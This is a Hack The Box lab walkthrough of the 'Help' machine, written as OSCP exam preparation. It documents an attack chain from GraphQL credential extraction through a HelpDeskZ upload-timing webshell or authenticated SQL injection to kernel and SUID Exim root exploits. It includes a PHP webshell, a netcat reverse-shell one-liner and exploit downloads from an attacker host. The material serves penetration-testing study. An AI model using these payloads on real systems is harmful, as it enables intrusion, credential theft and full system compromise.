# Help — HTB (TJ Null OSCP List)

| Detail       | Value                          |
|--------------|--------------------------------|
| **IP**       | 10.129.230.159                 |
| **OS**       | Linux (Ubuntu 16.04 Xenial)    |
| **Difficulty** | Easy                         |
| **Key Skills** | GraphQL introspection + credential extraction, HelpDeskZ file upload timing attack (predictable filename), Authenticated blind SQLi (sqlmap), Kernel exploit (CVE-2017-16995), SUID Exim privesc alternative |

---

## 1. Enumeration

### Nmap — Key Ports
```bash
sudo nmap -sC -sV -A -O -p- 10.129.230.159 -Pn --min-rate 1000
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
3000/tcp open  http    Node.js Express framework (returns JSON)
```

### Key Observations
- **Port 80** — Apache default page, redirects to `help.htb` (add to `/etc/hosts`)
- **Port 3000** — Node.js Express returning JSON — unusual, needs investigation
- **OpenSSH 7.2p2 + Apache 2.4.18** — maps to Ubuntu 16.04 (Xenial)

### Web Enumeration (Port 80)
```bash
feroxbuster -u http://help.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Found: /support/ — HelpDeskZ application
# Also: /javascript/

# Deeper enumeration on /support
feroxbuster -u http://help.htb/support/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Found: /uploads/, /uploads/tickets/ ← important for file upload exploit
```

**HelpDeskZ version:** Check `http://help.htb/support/readme.html` → **Version 1.0.2 (2015)**

> **OSCP Technique — Version Discovery:**
> When the main page doesn't show a version, check `/readme.html`, `/README.md`, `/CHANGELOG`, `/composer.json`, or `/package.json`. These are often left accessible and reveal exact versions.

---

## 2. GraphQL Enumeration (Port 3000)

### Discovery
Visiting `http://help.htb:3000/` returns:
```json
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```
This hints at a **GraphQL** API.

### GraphQL Introspection — Full Methodology

**Step 1 — Confirm GraphQL endpoint:**
```bash
curl -s http://help.htb:3000/graphql
# Returns data → endpoint confirmed
# Common paths: /graphql, /api/graphql, /graphiql, /v1/graphql
```

**Step 2 — Enumerate schema root fields:**
```bash
curl -s http://help.htb:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name fields { name description } } } }"}' | jq .
# Result: one field → "user"
```

**Step 3 — List all types:**
```bash
curl -s http://help.htb:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | jq .
# Result: Query, User, String, plus internal __Schema types
```

**Step 4 — Enumerate fields on the User type:**
```bash
curl -s http://help.htb:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { name fields { name } } }"}' | jq .
# Result: username, password
```

**Step 5 — Extract data:**
```bash
# Simple GET method (also works):
curl -s "http://help.htb:3000/graphql?query={user{username,password}}" | jq .

# POST method:
curl -s http://help.htb:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { username password } }"}' | jq .
```

**Result:**
```json
{
  "data": {
    "user": {
      "username": "<username>",
      "password": "<password>"
    }
  }
}
```

### Crack the Hash
```bash
# 32 hex chars = MD5
# Use crackstation.net or hashcat:
echo '<password>' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# Result: godhelpmeplz
```

**Credential:** `helpme@helpme.com` / `godhelpmeplz` → logs into HelpDeskZ at `/support/`

> **OSCP Technique — GraphQL Introspection:**
> GraphQL APIs often expose their entire schema through introspection. The 5-step methodology: (1) find the endpoint, (2) query `__schema` for root fields, (3) list all types, (4) enumerate fields per type with `__type(name: "...")`, (5) extract data. Reference: [PayloadsAllTheThings GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)

---

## 3. Initial Access — Path A: HelpDeskZ File Upload RCE (Timing Attack)

### The Vulnerability (EDB-40300)
HelpDeskZ 1.0.2 has a file upload flaw:
1. When you submit a ticket with an attachment, `move_uploaded_file()` saves the file **before** extension validation
2. Even if the extension is rejected ("File is not allowed"), the file **stays on disk**
3. The stored filename is **predictable**: `md5(original_filename + unix_timestamp) . ".php"`

### Exploitation

**Step 1 — Create a PHP webshell:**
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > cmd.php
```

**Step 2 — Upload it via a support ticket:**
- Log into HelpDeskZ with `helpme@helpme.com` / `godhelpmeplz`
- Create a new ticket → attach `cmd.php`
- The site says "File is not allowed" — but the file is already saved

**Step 3 — Find the uploaded file (timing brute force):**
```bash
# The filename = md5("cmd.php" + unix_timestamp_at_upload)
# The exploit tries timestamps around the current time
searchsploit -m 40300
python 40300.py http://help.htb/support/uploads/tickets/ cmd.php
```

**If the script fails (clock skew):** The box clock may be offset. Modify the script to scan a wider window:
```python
# In the exploit, change the time range:
currentTime = int(time.time()) - 300  # Start 5 minutes ago
for x in range(0, 1200):              # Scan 20 minutes backward
    # md5(fileName + str(currentTime - x))
```

**Step 4 — Execute commands:**
```bash
# Once found:
curl "http://help.htb/support/uploads/tickets/30487f2924a0ae640ba2c0a54c9136f1.php?cmd=id"
# uid=1000(help) gid=1000(help) groups=1000(help),4(adm),...

# Reverse shell:
curl "http://help.htb/support/uploads/tickets/<hash>.php" \
  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 443 >/tmp/f"
```

> **OSCP Technique — Predictable Upload Filenames:**
> When a web app stores uploads with a computed filename (MD5 of name + timestamp), you can brute-force the filename by trying timestamps around the upload time. Even if the app rejects the file type, the file may already be written to disk. Always check the upload directory even after a "rejected" message.

---

## 4. Initial Access — Path B: Authenticated SQLi (sqlmap)

### The Vulnerability (EDB-41200)
HelpDeskZ < 1.0.2 has **blind boolean SQLi** in the attachment download parameter.

### Exploitation

**Step 1 — Create a ticket with an attachment to get a valid download URL:**
```
http://help.htb/support/?v=view_tickets&action=ticket&param[]=2&param[]=attachment&param[]=1&param[]=1
```

**Step 2 — Confirm injection:**
```
# Returns file → true condition:
param[]=1 and 1=1-- -

# Returns "Whoops!" → false condition:
param[]=1 and 1=2-- -
```

**Step 3 — Run sqlmap:**
```bash
# Save the request to a file from Burp, then:
sqlmap -r ticket_attachment.request --level 5 --risk 3 -p "param[]" --dump
```

**Result from `support.staff` table:**
```
username: admin
password: d318f44739dced66793b1a603028133a76ae680e (SHA-1 → Welcome1)
email: support@mysite.com
```

**Step 4 — SSH as help:**
```bash
ssh help@help.htb
# Password: Welcome1
```

> **OSCP Technique — Blind Boolean SQLi:**
> When one parameter value returns normal content and another returns an error, test with `and 1=1-- -` vs `and 1=2-- -`. If behavior differs, it's blind boolean SQLi. Use sqlmap with `--level 5 --risk 3` for thorough testing on tricky injection points like array parameters (`param[]`).

---

## 5. Privilege Escalation — Kernel Exploit (CVE-2017-16995)

### Identify the Target
```bash
uname -a
# Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64

cat /etc/os-release
# Ubuntu 16.04
```

### Search for Exploits
```bash
searchsploit linux 4.4.0
# 44298.c — Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
# 45010.c — Linux Kernel < 4.13.9 (Ubuntu 16.04) - Local Privilege Escalation
```

### Exploit (EDB-44298 — CVE-2017-16995)
```bash
# On Kali — host the exploit
searchsploit -m 44298
python3 -m http.server 8002

# On target — download, compile, run
cd /dev/shm
wget http://10.10.14.4:8002/44298.c
gcc -o exploit 44298.c
./exploit
# task_struct = ffff88003e3f5400
# uidptr = ffff880036fb7cc4
# spawning root shell
# root@help:~#
```

### Root Flag
```bash
cat /root/root.txt
```

> **OSCP Technique — Kernel Exploits:**
> When no sudo/SUID/cron privesc exists, check the kernel version. `4.4.0-116` on Ubuntu 16.04 is vulnerable to CVE-2017-16995 (eBPF verifier bug). Always compile on the target if `gcc` is available, or cross-compile on Kali with matching architecture. Work in `/dev/shm` or `/tmp` to avoid leaving traces.

---

## 6. Alternative Privesc — SUID Exim (CVE-2016-1531)

### Discovery
```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/sbin/exim4 ← SUID root!

/usr/sbin/exim4 --version
# Exim version 4.86_2
```

### Exploit
```bash
searchsploit exim 4.86
# 39535.sh — Exim < 4.86.2 - Local Privilege Escalation (CVE-2016-1531)

searchsploit -m 39535
chmod +x 39535.sh
./39535.sh
# Exploits PERL_STARTUP environment variable handling in SUID exim
```

> **OSCP Technique — SUID Enumeration:**
> `find / -perm -4000 -type f 2>/dev/null` is a mandatory check. Non-standard SUID binaries like `exim4`, `pkexec`, `screen-4.5.0` are often exploitable. Check the version and search immediately.

---

## 7. Attack Chain Summary

```
Port 3000 (Node.js Express)
    |
    +--> GraphQL introspection
    |        |
    |        +--> { user { username password } }
    |                 |
    |                 +--> helpme@helpme.com : godhelpmeplz (MD5 cracked)
    |
    +--> Login to HelpDeskZ (/support/)
             |
             +--> Path A: File Upload RCE (timing attack)
             |        |
             |        +--> Upload cmd.php → brute-force md5(name+timestamp)
             |                 |
             |                 +--> Webshell → reverse shell as help
             |
             +--> Path B: Authenticated SQLi (sqlmap)
                      |
                      +--> Dump support.staff → admin : Welcome1 (SHA-1)
                               |
                               +--> SSH as help
                                        |
                                        +--> USER FLAG
                                        |
                                        +--> Privesc Option 1: Kernel exploit 44298.c (CVE-2017-16995)
                                        |        |
                                        |        +--> ROOT FLAG
                                        |
                                        +--> Privesc Option 2: SUID exim4 (CVE-2016-1531)
                                                 |
                                                 +--> ROOT FLAG
```

---

## 8. OSCP Exam Takeaways

### Techniques Demonstrated
1. **GraphQL introspection** — 5-step methodology to enumerate and extract data from GraphQL APIs
2. **Multiple attack paths** — file upload RCE AND SQLi both lead to initial access
3. **Predictable upload filenames** — `md5(filename + timestamp)` brute force when files are "rejected" but saved
4. **Blind boolean SQLi** — `and 1=1` vs `and 1=2` detection, sqlmap with array parameters
5. **Hash cracking** — MD5 (32 hex) and SHA-1 (40 hex) identification by length
6. **Kernel exploit** — CVE-2017-16995 for Linux 4.4.0-116 on Ubuntu 16.04
7. **SUID abuse** — Exim 4.86.2 with SUID root (CVE-2016-1531)
8. **Credential reuse** — GraphQL creds work for HelpDeskZ, SQLi-dumped creds work for SSH

### Exam Patterns
- **Non-standard ports are always worth investigating** — port 3000 with JSON hints at an API, not a normal website
- **"File not allowed" doesn't mean the file wasn't uploaded** — always check the upload directory
- **Clock skew breaks timing attacks** — widen your brute-force window if the target clock is off
- **Multiple privesc paths exist** — if one fails, try another (kernel + SUID on this box)
- **GraphQL is becoming more common** — know the introspection queries by heart
- **Array parameters (`param[]`)** in URLs are often injectable — sqlmap needs `--level 5` to detect them
